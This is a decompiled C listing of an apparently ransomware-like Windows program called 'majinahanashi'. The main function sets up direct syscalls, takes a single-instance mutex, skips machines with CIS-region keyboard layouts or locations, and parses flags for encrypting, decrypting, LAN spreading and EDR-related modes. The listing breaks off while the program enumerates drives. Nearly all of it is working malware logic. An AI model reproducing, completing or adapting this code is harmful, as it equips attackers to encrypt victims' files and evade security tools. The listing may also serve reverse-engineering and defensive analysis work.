/* Hex-Rays decompilation of majinahanashi */

// ----- sub_140001000 @ 0x140001000 -----
__int64 sub_140001000()
{
  BOOL v0; // r12d
  int v1; // r13d
  int v2; // r14d
  int v3; // r15d
  void (__fastcall *v4)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v5; // eax
  __int64 v6; // rax
  int v7; // esi
  __int64 v8; // rdi
  void (__fastcall *v9)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rdi
  unsigned int v10; // eax
  int v11; // ebx
  unsigned int v12; // esi
  __int64 v13; // r8
  _BYTE *v14; // r10
  signed int v15; // r9d
  __int64 v16; // r11
  __int64 v17; // rdx
  char v18; // cl
  void (__fastcall *v19)(__int64, WCHAR *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v20; // eax
  void (__fastcall *v21)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v22; // eax
  void (__fastcall *v23)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v24; // eax
  void (__fastcall *v25)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v26; // eax
  int KeyboardLayoutList; // eax
  __int64 v28; // rbx
  __int64 v29; // rcx
  __int64 v30; // rax
  GEOID UserGeoID; // eax
  __int64 v32; // rbx
  void (__fastcall *v33)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v34; // eax
  void (__fastcall *v35)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v36; // eax
  _BYTE *v37; // rsi
  int v38; // edx
  char v39; // al
  __int64 v40; // rcx
  unsigned int (__fastcall *v41)(_BYTE *, const char *); // rax
  char v42; // al
  _BYTE *v43; // r15
  char v44; // al
  _BYTE *i; // r15
  __int64 (__fastcall *v46)(__int64, _QWORD, _QWORD); // rdi
  int v47; // r14d
  __int64 v48; // rax
  __int64 v49; // rax
  __int64 v50; // rdi
  __int64 (__fastcall *v51)(__int64, _QWORD, _QWORD); // rdi
  int v52; // r14d
  __int64 v53; // rax
  __int64 v54; // rax
  __int64 v55; // rdi
  __int64 v56; // rbx
  _BYTE *v57; // rax
  __int64 v58; // rax
  __int64 v59; // rsi
  void (__fastcall *v60)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v61; // eax
  __int64 v62; // rax
  __int64 v63; // rsi
  void (__fastcall *v64)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v65; // eax
  __int64 v66; // rax
  __int64 v67; // rsi
  void (__fastcall *v68)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v69; // eax
  int v70; // r15d
  const char *v71; // rsi
  __int64 v72; // r14
  void (__fastcall *v73)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v74; // eax
  __int64 v75; // rsi
  void (__fastcall *v76)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v77; // eax
  int v78; // r13d
  __int64 v79; // rsi
  void (__fastcall *v80)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v81; // eax
  unsigned __int8 *v82; // r12
  __int64 v83; // rdi
  void (__fastcall *v84)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v85; // eax
  __m128i si128; // xmm0
  HKL *v87; // r15
  int v88; // eax
  const char *v89; // rdi
  const char *v90; // rsi
  __int64 v91; // r14
  void (__fastcall *v92)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v93; // eax
  __int64 v94; // r14
  void (__fastcall *v95)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v96; // eax
  __int64 v97; // rdi
  void (__fastcall *v98)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v99; // eax
  __int64 v100; // rsi
  void (__fastcall *v101)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v102; // eax
  HANDLE CurrentProcess; // rax
  HMODULE v104; // rax
  FARPROC NtSetInformationProcess; // rbx
  HANDLE v106; // rax
  bool v107; // sf
  const char *v108; // rcx
  __int64 v109; // rdi
  void (__fastcall *v110)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v111; // eax
  __int64 v112; // rax
  __int64 v113; // rsi
  void (__fastcall *v114)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v115; // eax
  __int64 v116; // rsi
  void (__fastcall *v117)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v118; // eax
  __int64 v119; // rsi
  void (__fastcall *v120)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v121; // eax
  __int64 v122; // rsi
  void (__fastcall *v123)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v124; // eax
  const char *v125; // rcx
  const char *v126; // rcx
  const char *v127; // rcx
  __int64 v128; // rdi
  void (__fastcall *v129)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v130; // eax
  __int64 v131; // rsi
  void (__fastcall *v132)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v133; // eax
  unsigned int v134; // eax
  __int64 v135; // rsi
  void (__fastcall *v136)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v137; // eax
  __int64 v143; // rsi
  void (__fastcall *v144)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v145; // eax
  __int64 v146; // rsi
  void (__fastcall *v147)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v148; // eax
  int v149; // ecx
  int v150; // edi
  const char *v151; // rcx
  const char *v152; // rcx
  signed int v153; // r15d
  __int64 v154; // rsi
  void (__fastcall *v155)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v156; // eax
  __int64 v157; // rdi
  void (__fastcall *v158)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v159; // eax
  __int64 v160; // rsi
  void (__fastcall *v161)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v162; // eax
  __int64 v163; // rdi
  void (__fastcall *v164)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v165; // eax
  __int64 v166; // rax
  int v167; // r14d
  void (__fastcall *v168)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v169; // eax
  __int64 v170; // r14
  __int64 v171; // rsi
  void (__fastcall *v172)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v173; // eax
  __int64 v174; // rsi
  void (__fastcall *v175)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v176; // eax
  __int64 v177; // rcx
  __int64 v178; // rdi
  void (__fastcall *v179)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v180; // eax
  HKL *v181; // rdi
  __int64 v182; // r14
  __int64 v183; // rsi
  void (__fastcall *v184)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v185; // eax
  __int64 v186; // rsi
  void (__fastcall *v187)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v188; // eax
  int v189; // eax
  __int64 v190; // rsi
  void (__fastcall *v191)(__int64, const char *, _QWORD, _BYTE *, _QWORD); // rbx
  unsigned int v192; // eax
  __int64 v193; // rsi
  void (__fastcall *v194)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v195; // eax
  __int64 v196; // rsi
  void (__fastcall *v197)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v198; // eax
  __int64 v199; // rsi
  void (__fastcall *v200)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v201; // eax
  __int64 v202; // rsi
  void (__fastcall *v203)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v204; // eax
  __int64 v205; // rsi
  void (__fastcall *v206)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v207; // eax
  __int64 v208; // rsi
  void (__fastcall *v209)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v210; // eax
  __int64 v211; // rsi
  void (__fastcall *v212)(__int64, const char *, _QWORD, char *, _QWORD); // rbx
  unsigned int v213; // eax
  __int64 v214; // rdx
  HANDLE v215; // rax
  HMODULE v216; // rax
  FARPROC ProcAddress; // rbx
  HANDLE v218; // rax
  const char *v219; // rcx
  __int64 v220; // rsi
  void (__fastcall *v221)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v222; // eax
  void (__fastcall *v223)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v224; // eax
  __int64 (__fastcall *v225)(__int64, __int64, __int64); // rdi
  __int64 v226; // rax
  __int64 j; // rbx
  void *v228; // rax
  int v229; // r15d
  int v230; // eax
  int v231; // eax
  int v232; // eax
  const char *v233; // rdx
  int v234; // r13d
  int v235; // eax
  int v236; // eax
  __int64 v237; // rsi
  void (__fastcall *v238)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v239; // eax
  int v240; // eax
  int v241; // esi
  __int64 (__fastcall *v242)(__int64, __int64, __int64); // rbx
  __int64 v243; // rax
  _QWORD *v244; // rdi
  __int64 (__fastcall *v245)(__int64, _QWORD, __int64); // rbx
  __int64 v246; // rax
  _BYTE *v247; // rax
  void (__fastcall *v248)(__int64, _QWORD, _QWORD *); // rbx
  __int64 v249; // rax
  HANDLE *v250; // rdi
  int v251; // esi
  __int64 v252; // rbx
  void (__fastcall *v253)(__int64, _QWORD, HANDLE *); // rbx
  __int64 v254; // rax
  __int64 v255; // rsi
  void (__fastcall *v256)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v257; // eax
  void (__fastcall *v258)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v259; // eax
  void (__fastcall *v260)(__int64, _QWORD, unsigned __int8 *); // rbx
  __int64 v261; // rax
  __int64 result; // rax
  __int64 v263; // rsi
  __int64 (__fastcall *v264)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v265; // eax
  void (__fastcall *v266)(__int64, const char *, _QWORD, int *, _QWORD); // rbx
  unsigned int v267; // eax
  __int64 v268; // rsi
  void (__fastcall *v269)(__int64, const char *, _QWORD, int *, _QWORD); // rdi
  unsigned int v270; // eax
  __int64 v271; // rax
  _BYTE v272[4]; // [rsp+40h] [rbp-C0h] BYREF
  int v273; // [rsp+44h] [rbp-BCh]
  int v274; // [rsp+48h] [rbp-B8h] BYREF
  int v275; // [rsp+4Ch] [rbp-B4h] BYREF
  WCHAR GeoData[2]; // [rsp+50h] [rbp-B0h] BYREF
  int v277; // [rsp+60h] [rbp-A0h]
  int v278; // [rsp+64h] [rbp-9Ch]
  int v279; // [rsp+68h] [rbp-98h]
  int v280; // [rsp+6Ch] [rbp-94h]
  int v281; // [rsp+70h] [rbp-90h]
  int v282; // [rsp+74h] [rbp-8Ch]
  unsigned __int8 *v283; // [rsp+78h] [rbp-88h]
  _QWORD *v284; // [rsp+80h] [rbp-80h] BYREF
  _QWORD *v285; // [rsp+88h] [rbp-78h]
  _BYTE v286[40]; // [rsp+90h] [rbp-70h] BYREF
  __int64 v287; // [rsp+B8h] [rbp-48h]
  int v288; // [rsp+C4h] [rbp-3Ch]
  HANDLE *lpHandles; // [rsp+C8h] [rbp-38h]
  DWORD nCount; // [rsp+D0h] [rbp-30h]
  int v291; // [rsp+D4h] [rbp-2Ch]
  int v292; // [rsp+D8h] [rbp-28h]
  char v293[4]; // [rsp+E0h] [rbp-20h] BYREF
  char v294[4]; // [rsp+E4h] [rbp-1Ch] BYREF
  char v295[4]; // [rsp+E8h] [rbp-18h] BYREF
  char v296[4]; // [rsp+ECh] [rbp-14h] BYREF
  char v297[16]; // [rsp+F0h] [rbp-10h] BYREF
  LPCWSTR lpString2[4]; // [rsp+100h] [rbp+0h] BYREF
  const wchar_t *v299; // [rsp+120h] [rbp+20h]
  const wchar_t *v300; // [rsp+128h] [rbp+28h]
  const wchar_t *v301; // [rsp+130h] [rbp+30h]
  const wchar_t *v302; // [rsp+138h] [rbp+38h]
  _BYTE v303[512]; // [rsp+140h] [rbp+40h] BYREF
  char v304[32]; // [rsp+340h] [rbp+240h] BYREF
  int v305; // [rsp+360h] [rbp+260h]
  HKL List[64]; // [rsp+370h] [rbp+270h] BYREF
  _DWORD v307[6]; // [rsp+570h] [rbp+470h] BYREF
  _BYTE v308[1024]; // [rsp+588h] [rbp+488h] BYREF
  char v309[1096]; // [rsp+988h] [rbp+888h] BYREF
  int v310; // [rsp+DE0h] [rbp+CE0h] BYREF
  int v311; // [rsp+DE8h] [rbp+CE8h] BYREF
  int v312; // [rsp+DF0h] [rbp+CF0h]
  int v313; // [rsp+DF8h] [rbp+CF8h]

  v0 = false;
  v1 = 0;
  v277 = 0;
  v2 = 0;
  v313 = 0;
  v3 = 0;
  v312 = 0;
  v274 = 0;
  v273 = 0;
  v278 = 0;
  v279 = 0;
  v282 = 0;
  v281 = 0;
  v310 = 0;
  v311 = 0;
  v280 = 0;
  v283 = nullptr;
  v275 = 0;
  if ( qword_140017000 != -1 )
  {
    v4 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
    v5 = qword_1400187C8("SVC: MajinRun enter\r\n");
    v4(qword_140017000, "SVC: MajinRun enter\r\n", v5, v272, 0);
    qword_1400186B8(qword_140017000);
  }
  v6 = qword_140018730("ntdll.dll");
  v7 = sub_14000ABB0(v6);
  qword_140018820((unsigned int)-v7);
  v8 = qword_140017000;
  if ( qword_140017000 != -1 )
  {
    v9 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
    v10 = qword_1400187C8("SVC: syscalls_init rc=");
    v9(qword_140017000, "SVC: syscalls_init rc=", v10, v272, 0);
    qword_1400186B8(qword_140017000);
    v8 = qword_140017000;
  }
  v11 = v7;
  if ( v7 < 0 )
  {
    LOBYTE(GeoData[0]) = 45;
    v11 = -v7;
  }
  v12 = (unsigned int)v7 >> 31;
  v13 = v12;
  v14 = (char *)GeoData + v12;
  if ( v11 != 0 )
  {
    v15 = v12;
    do
    {
      v16 = v15++;
      *v14++ = v11 % 10 + 48;
      v11 /= 10;
    }
    while ( v11 != 0 );
    v17 = v16;
    if ( v12 < v16 )
    {
      do
      {
        v18 = *((_BYTE *)GeoData + v13);
        *((_BYTE *)GeoData + v13++) = *((_BYTE *)GeoData + v17);
        *((_BYTE *)GeoData + v17--) = v18;
      }
      while ( v13 < v17 );
    }
  }
  else
  {
    *v14 = 48;
    v15 = v12 + 1;
  }
  *((_BYTE *)GeoData + v15) = 0;
  if ( v8 != -1 )
  {
    v19 = (void (__fastcall *)(__int64, WCHAR *, _QWORD, _BYTE *, _QWORD))qword_140018880;
    v20 = qword_1400187C8(GeoData);
    v19(qword_140017000, GeoData, v20, v272, 0);
    qword_1400186B8(qword_140017000);
    if ( qword_140017000 != -1 )
    {
      v21 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
      v22 = qword_1400187C8("\r\n");
      v21(qword_140017000, "\r\n", v22, v272, 0);
      qword_1400186B8(qword_140017000);
    }
  }
  if ( qword_140018660(0, 1, 0, "Global\\majinahanashi_Mutex") == 0 || (unsigned int)qword_140018710() == 183 )
  {
    if ( qword_140017000 != -1 )
    {
      v23 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
      v24 = qword_1400187C8("SVC: mutex collision, exit\r\n");
      v23(qword_140017000, "SVC: mutex collision, exit\r\n", v24, v272, 0);
      qword_1400186B8(qword_140017000);
    }
    qword_140018698(0);
  }
  if ( qword_140017000 != -1 )
  {
    v25 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
    v26 = qword_1400187C8("SVC: mutex ok\r\n");
    v25(qword_140017000, "SVC: mutex ok\r\n", v26, v272, 0);
    qword_1400186B8(qword_140017000);
  }
  KeyboardLayoutList = GetKeyboardLayoutList(64, List);
  wmemcpy(GeoData, L"ЙТУпШрࡃࠬ", 8);
  if ( KeyboardLayoutList > 0 )
  {
    v28 = KeyboardLayoutList;
    v29 = 0;
LABEL_25:
    if ( v29 < 64 )
    {
      v30 = 0;
      while ( LOWORD(List[v29]) != GeoData[v30] )
      {
        if ( ++v30 >= 8 )
        {
          if ( ++v29 < v28 )
            goto LABEL_25;
          goto LABEL_30;
        }
      }
      goto LABEL_35;
    }
  }
LABEL_30:
  UserGeoID = GetUserGeoID(0x10u);
  if ( GetGeoInfoW(UserGeoID, 4u, GeoData, 8, 0) > 0 )
  {
    v32 = 0;
    lpString2[0] = L"RU";
    lpString2[1] = L"BY";
    lpString2[2] = L"UA";
    lpString2[3] = L"KZ";
    v299 = L"TJ";
    v300 = L"KG";
    v301 = L"UZ";
    v302 = L"AZ";
    while ( lstrcmpiW(GeoData, lpString2[v32]) != 0 )
    {
      if ( ++v32 >= 8 )
        goto LABEL_39;
    }
LABEL_35:
    qword_140018658("C:\\1", 0);
    qword_140017000 = qword_140018648("C:\\1\\service.log", 0x40000000, 3, 0, 2, 128, 0);
    if ( qword_140017000 != -1 )
    {
      v33 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
      v34 = qword_1400187C8("SVC: log open\r\n");
      v33(qword_140017000, "SVC: log open\r\n", v34, v272, 0);
      qword_1400186B8(qword_140017000);
      if ( qword_140017000 != -1 )
      {
        v35 = (void (__fastcall *)(__int64, const char *, _QWORD, _BYTE *, _QWORD))qword_140018880;
        v36 = qword_1400187C8("SVC: CIS machine, exit\r\n");
        v35(qword_140017000, "SVC: CIS machine, exit\r\n", v36, v272, 0);
        qword_1400186B8(qword_140017000);
      }
    }
    qword_140018698(0);
  }
LABEL_39:
  v37 = (_BYTE *)qword_1400186C0();
  v38 = 0;
  v39 = *v37;
  if ( *v37 == 0 )
    goto LABEL_126;
  v40 = 0;
  do
  {
    if ( v39 == 34 )
    {
      v0 = !v0;
    }
    else
    {
      if ( v39 != 32 || v0 )
      {
        if ( v40 < 511 )
        {
          ++v38;
          v303[v40++] = v39;
        }
        goto LABEL_93;
      }
      if ( v40 > 0 )
      {
        v41 = (unsigned int (__fastcall *)(_BYTE *, const char *))qword_1400187A0;
        v303[v40] = 0;
        if ( v41(v303, "--lan") != 0 )
        {
          if ( (unsigned int)qword_1400187A0(v303, "--nolan") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v277 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--decrypt") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v313 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--dry-run") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v312 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--discover") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v274 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--nopf") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v273 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--spread") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v282 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--dev") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v281 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--edr-dev") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v1 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--qos-dev") == 0 )
          {
            v3 = v311;
            v38 = 0;
            v40 = 0;
            v310 = 1;
            v2 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--test-pre") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v40 = 0;
            v311 = 1;
            v3 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--fast") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v278 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--full") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v279 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--safe") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            v280 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--verbose") == 0 )
          {
            v2 = v310;
            v38 = 0;
            v3 = v311;
            v40 = 0;
            dword_140017658 = 1;
            goto LABEL_94;
          }
          if ( (unsigned int)qword_1400187A0(v303, "--path") == 0 )
          {
            v42 = v37[1];
            v43 = v37 + 1;
            if ( v42 == 34 )
            {
              v44 = v37[2];
              v37 += 2;
              for ( i = v37; v44 != 0; v44 = *++v37 )
              {
                if ( v44 == 34 )
                  break;
              }
              v46 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD))qword_140018768;
              v47 = (_DWORD)v37 - (_DWORD)i;
              v48 = qword_140018740();
              v49 = v46(v48, 0, (int)v37 - (int)i + 1);
              v283 = (unsigned __int8 *)v49;
              v50 = v49;
              if ( v49 != 0 )
              {
                sub_14000A820(v49, i, v47);
                *(_BYTE *)(v47 + v50) = 0;
                v275 = 1;
              }
              v2 = v310;
              v3 = v311;
              if ( *v37 == 34 )
              {
                ++v37;
                v38 = 0;
                v40 = 0;
                goto LABEL_94;
              }
              goto LABEL_90;
            }
            ++v37;
            for ( ; v42 != 0; v42 = *++v37 )
            {
              if ( v42 == 32 )
                break;
            }
            v51 = (__int64 (__fastcall *)(__int64, _QWORD, _QWORD))qword_140018768;
            v52 = (_DWORD)v37 - (_DWORD)v43;
            v53 = qword_140018740();
            v54 = v51(v53, 0, (int)v37 - (int)v43 + 1);
            v283 = (unsigned __int8 *)v54;
            v55 = v54;
            if ( v54 != 0 )
            {
              v56 = v52;
              sub_14000A820(v54, v43, v52);
              v2 = v310;
              v38 = 0;
              v3 = v311;
              v40 = 0;
              *(_BYTE *)(v56 + v55) = 0;
              v275 = 1;
              goto LABEL_94;
            }
          }
        }
        v2 = v310;
        v3 = v311;
LABEL_90:
        v38 = 0;
        v40 = 0;
        goto LABEL_94;
      }
    }
LABEL_93:
    v3 = v311;
    v2 = v310;
LABEL_94:
    v57 = v37++;
    v39 = v57[1];
  }
  while ( v39 != 0 );
  if ( v38 > 0 )
  {
    v303[v38] = 0;
    if ( (unsigned int)qword_1400187A0(v303, "--lan") != 0 )
    {
      if ( (unsigned int)qword_1400187A0(v303, "--nolan") == 0 )
      {
        v277 = 1;
        goto LABEL_125;
      }
      if ( (unsigned int)qword_1400187A0(v303, "--decrypt") == 0 )
      {
        v0 = true;
        v313 = 1;
        goto LABEL_129;
      }
      if ( (unsigned int)qword_1400187A0(v303, "--dry-run") != 0 )
      {
        if ( (unsigned int)qword_1400187A0(v303, "--discover") != 0 )
        {
          if ( (unsigned int)qword_1400187A0(v303, "--nopf") != 0 )
          {
            if ( (unsigned int)qword_1400187A0(v303, "--spread") != 0 )
            {
              if ( (unsigned int)qword_1400187A0(v303, "--dev") != 0 )
              {
                if ( (unsigned int)qword_1400187A0(v303, "--edr-dev") != 0 )
                {
                  if ( (unsigned int)qword_1400187A0(v303, "--qos-dev") != 0 )
                  {
                    if ( (unsigned int)qword_1400187A0(v303, "--test-pre") != 0 )
                    {
                      if ( (unsigned int)qword_1400187A0(v303, "--fast") != 0 )
                      {
                        if ( (unsigned int)qword_1400187A0(v303, "--full") != 0 )
                        {
                          if ( (unsigned int)qword_1400187A0(v303, "--safe") != 0 )
                          {
                            if ( (unsigned int)qword_1400187A0(v303, "--verbose") == 0 )
                              dword_140017658 = 1;
                          }
                          else
                          {
                            v280 = 1;
                          }
                        }
                        else
                        {
                          v279 = 1;
                        }
                      }
                      else
                      {
                        v278 = 1;
                      }
                    }
                    else
                    {
                      v3 = 1;
                    }
                  }
                  else
                  {
                    v2 = 1;
                  }
                }
                else
                {
                  v1 = 1;
                }
              }
              else
              {
                v281 = 1;
              }
            }
            else
            {
              v282 = 1;
            }
          }
          else
          {
            v273 = 1;
          }
        }
        else
        {
          v274 = 1;
        }
      }
      else
      {
        v312 = 1;
      }
    }
  }
LABEL_125:
  v0 = v313;
  if ( v313 == 0 )
  {
LABEL_126:
    if ( (unsigned int)off_140017208() != 0 )
    {
      off_140017018();
      off_140017020();
    }
    else
    {
      off_140017210();
    }
  }
LABEL_129:
  if ( v1 != 0 )
  {
    v58 = qword_140018730("ntdll.dll");
    sub_14000ABB0(v58);
    off_140017018();
    off_140017020();
  }
  if ( v2 != 0 )
  {
    if ( (unsigned int)off_140017208() != 0 )
      sub_1400042E0("[!] QoS module init failed (run as admin?)\r\n");
    else
      off_140017210();
  }
  if ( v3 != 0 )
  {
    if ( dword_140017658 != 0 )
    {
      v59 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v59 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v60 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v61 = qword_1400187C8("[!] Run test preflight mode..\r\n");
        v60(v59, "[!] Run test preflight mode..\r\n", v61, &v310, 0);
      }
    }
    v62 = qword_140018730("ntdll.dll");
    sub_14000ABB0(v62);
    off_1400173F8();
    off_140017400();
    off_140017408();
  }
  else
  {
    off_1400173F8();
    off_140017400();
  }
  if ( v1 != 0 || v2 != 0 || v3 != 0 )
  {
    if ( dword_140017658 != 0 )
    {
      v63 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v63 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v64 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v65 = qword_1400187C8("[*] Press any key to cleanup and exit...\r\n");
        v64(v63, "[*] Press any key to cleanup and exit...\r\n", v65, &v310, 0);
      }
    }
    v66 = qword_140018750(4294967286LL);
    if ( (unsigned __int64)(v66 - 1) > 0xFFFFFFFFFFFFFFFDuLL )
      qword_140018830(30000);
    else
      qword_1400187F8(v66, &v310, 1, &v311, 0);
    off_140017028();
    off_140017218();
    off_140017410();
    qword_140018698(0);
  }
  if ( dword_140017658 != 0 )
  {
    v67 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v67 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v68 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v69 = qword_1400187C8("\r\nmajinahanashi\r\n");
      v68(v67, "\r\nmajinahanashi\r\n", v69, &v310, 0);
    }
  }
  v70 = v274;
  if ( v0 )
  {
    v71 = "decrypt";
  }
  else if ( v312 != 0 )
  {
    v71 = "dry-run";
  }
  else
  {
    v71 = "encrypt";
    if ( v274 != 0 )
      v71 = "discover";
  }
  if ( dword_140017658 != 0 )
  {
    v72 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v72 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v73 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v74 = qword_1400187C8("mode: ");
      v73(v72, "mode: ", v74, &v310, 0);
    }
  }
  sub_1400042E0(v71);
  if ( v277 != 0 && dword_140017658 != 0 )
  {
    v75 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v75 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v76 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v77 = qword_1400187C8(" nolan");
      v76(v75, " nolan", v77, &v310, 0);
    }
  }
  v78 = v275;
  if ( v275 != 0 )
  {
    if ( dword_140017658 != 0 )
    {
      v79 = qword_140018750(4294967285LL);
      if ( (unsigned __int64)(v79 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
      {
        v80 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
        v81 = qword_1400187C8(" path=");
        v80(v79, " path=", v81, &v310, 0);
      }
    }
    v82 = v283;
    sub_1400042E0(v283);
  }
  else
  {
    v82 = v283;
  }
  if ( dword_140017658 != 0 )
  {
    v83 = qword_140018750(4294967285LL);
    if ( (unsigned __int64)(v83 - 1) <= 0xFFFFFFFFFFFFFFFDuLL )
    {
      v84 = (void (__fastcall *)(__int64, const char *, _QWORD, int *, _QWORD))qword_140018880;
      v85 = qword_1400187C8("\r\n");
      v84(v83, "\r\n", v85, &v310, 0);
    }
  }
  if ( v279 != 0 )
  {
    HIDWORD(xmmword_140017620) = 1;
  }
  else
  {
    if ( v278 != 0 )
      si128 = _mm_load_si128((const __m128i *)&xmmword_14000FE70);
    else
      si128 = _mm_load_si128((const __m128i *)&xmmword_14000FE60);
    xmmword_140017620 = (__int128)si128;
  }
  if ( v70 != 0 )
  {
    if ( (unsigned int)qword_140018718(512, List) - 1 <= 0x1FE )
    {
      v87 = List;
      if ( LOBYTE(List[0]) != 0 )
      {
        do
        {
          v88 = qword_1400186D0(v87);
          if ( v88 == 3 )
          {
            v89 = "FIXED";
            v90 = " HDD";
            if ( (unsigned int)sub_140003FB0(*(unsigned __int8 *)v87) != 0 )
              v90 = " SSD";
          }
          else
          {
            if ( v88 == 4 )
            {
